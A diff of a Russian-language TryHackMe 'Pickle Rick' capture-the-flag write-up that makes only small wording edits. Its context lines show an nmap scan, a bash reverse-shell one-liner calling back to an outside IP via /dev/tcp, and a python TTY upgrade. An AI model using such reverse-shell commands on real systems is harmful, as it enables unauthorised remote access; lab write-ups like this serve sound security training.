@@ -1,8 +1,6 @@
 # TryHackMe: Pickle Rick
 
-
 *Дата: 21.10.2026*
-
 
 ### Сложность: Easy
 
@@ -18,7 +16,7 @@
 
 ---
 
-Начинаю с этапа сканирования:
+Начинаю со сканирования:
 
 ```bash
 nmap -sV -T4 10.114.151.146 -p-
@@ -60,7 +58,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.166.222/4444 0>&1'
 
 ![Getting reverse-shell](images/CommandPanel.jpg)
 
-Получаю `TTY`:
+Получаю `TTY (Teletypewriter)`:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
